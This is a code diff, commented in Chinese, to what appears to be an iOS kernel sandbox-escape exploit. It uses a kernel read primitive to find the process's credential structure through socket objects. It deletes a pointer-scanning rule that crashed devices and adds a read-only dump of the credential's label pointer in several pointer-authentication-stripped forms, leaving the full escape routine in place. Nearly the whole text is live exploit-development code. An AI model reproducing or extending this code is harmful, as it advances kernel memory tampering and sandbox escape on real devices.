@@ -620,22 +620,9 @@ static uint64_t ds_discover_identities_v3(void)
         ds_log("[逃逸] 两个 socket 没有共同的堆指针能通过 cr_uid 校验");
     }
 
-    // 规则二：只在堆指针里找、且必须 cr_uid 对得上（每个 offset 最多一次解引用，范围有界）
-    for (int s = 0; s < socketCount; s++) {
-        for (uint64_t off = 0; off < 0x800; off += 8) {
-            uint64_t raw = ds_kread_safe(sockets[s] + off);
-            if (!raw) continue;
-            uint64_t cand = ds_normalize_ptr(raw);
-            if (!ds_is_heap_pointer(cand)) continue;
-            if ((cand & 0xF) != 0) continue;   // 同上：只解引用 16 字节对齐的堆对象
-            if (ds_kread32_safe(cand + DS_OFF_UCRED_POSIX) != myuid) continue;
-
-            gUcred = cand;
-            ds_log("[逃逸] 命中（单 socket + cr_uid 校验）：socket%d+0x%llx → cred 0x%llx",
-                   s, (unsigned long long)off, (unsigned long long)cand);
-            return cand;
-        }
-    }
+    // 规则二（单 socket 全字段扫描 + 逐个解引用）**已删除**。
+    // 实测教训：放宽判据后，socket 里像 0xffffffff… 这样的垃圾值也会通过 0xffff 前缀检查，
+    // 对它们解引用 = 读未映射地址 = 内核 panic（设备重启）。规则一已经足够可靠，不再需要它。
 
     // 规则三：给「so_background_thread 会被填充」的机型留的路（本机是 0，会直接跳过）。
     // 全程用 heap+对齐+p_pid 三重校验，确认 proc 之后才去 proc_ro 里按 cr_uid 找 cred。
@@ -840,7 +827,63 @@ static int DSEscapeSandboxInternal(void)
     return 0;
 }
 
+/// 只读诊断：把 cred 里「指向 label 的那个字段」的原始值、以及各种还原形态**全部打印出来**。
+/// 全程只读这个已确认的 cred 对象内部，绝不跟随里面的指针 → 构造上不可能把内核读崩。
+static void ds_dump_cred_diagnostics(uint64_t cred)
+{
+    uint64_t observedZoneBase = g_ctx.rw_socket_pcb & 0xFFFFFFF000000000ULL;
+    ds_log("[诊断] cred = 0x%llx（已通过 so_cred 共享 + cr_uid 校验）", (unsigned long long)cred);
+    ds_log("[诊断] 本次启动：kernel_base=0x%llx rw_pcb=0x%llx socket=0x%llx zone段基址≈0x%llx",
+           (unsigned long long)g_ctx.kernel_base,
+           (unsigned long long)g_ctx.rw_socket_pcb,
+           (unsigned long long)gSelfSocketObject,
+           (unsigned long long)observedZoneBase);
+
+    static const uint64_t candOffsets[3] = { 0x78, 0x80, 0x70 };
+    for (int i = 0; i < 3; i++) {
+        uint64_t raw = ds_kread_safe(cred + candOffsets[i]);
+        if (!raw) {
+            ds_log("[诊断] cred+0x%llx = 0", (unsigned long long)candOffsets[i]);
+            continue;
+        }
+        uint64_t xpaci = ds_xpaci(raw);
+        uint64_t xpacd = ds_xpacd(raw);
+        ds_log("[诊断] cred+0x%llx raw  = 0x%016llx", (unsigned long long)candOffsets[i], (unsigned long long)raw);
+        ds_log("[诊断]          xpaci= 0x%016llx   xpacd= 0x%016llx",
+               (unsigned long long)xpaci, (unsigned long long)xpacd);
+        ds_log("[诊断]          low36|zone观测= 0x%016llx   low36|0xffffffe0= 0x%016llx",
+               (unsigned long long)((raw & 0x0000000FFFFFFFFFULL) | observedZoneBase),
+               (unsigned long long)((raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFE000000000ULL));
+        ds_log("[诊断]          low48|0xffff0000= 0x%016llx   low36|0xffffffde= 0x%016llx",
+               (unsigned long long)((raw & 0x0000FFFFFFFFFFFFULL) | 0xFFFF000000000000ULL),
+               (unsigned long long)((raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFDE00000000ULL));
+        ds_log("[诊断]          xpaci|pac_mask(47)= 0x%016llx   xpacd|pac_mask(47)= 0x%016llx",
+               (unsigned long long)(xpaci | 0xFFFF800000000000ULL),
+               (unsigned long long)(xpacd | 0xFFFF800000000000ULL));
+    }
+    ds_log("[诊断] 以上均为只读；本轮不跟随任何指针、不写任何内核内存");
+}
+
 int DSEscapeSandbox(ds_escape_log_fn log)
+{
+    gLog = log;
+
+    // ---- 诊断模式：只读，绝不写 ----
+    // 上一版仍在「猜测地址后解引用」，实测会 panic 重启。这里彻底不做，
+    // 先把真实数据取回来定准形态，再出「只解引用一次」的最终版本。
+    uint64_t cred = ds_discover_identities_v3();
+    if (!cred) {
+        ds_log("[诊断] 连 cred 都没定位到（见上面转储）");
+        gLog = NULL;
+        return -2;
+    }
+    ds_dump_cred_diagnostics(cred);
+    ds_log("[诊断] 本轮到此为止（激活会显示失败，但设备一定安全）");
+    gLog = NULL;
+    return -7;
+}
+
+int DSEscapeSandboxFull(ds_escape_log_fn log)
 {
     gLog = log;
     int result = DSEscapeSandboxInternal();
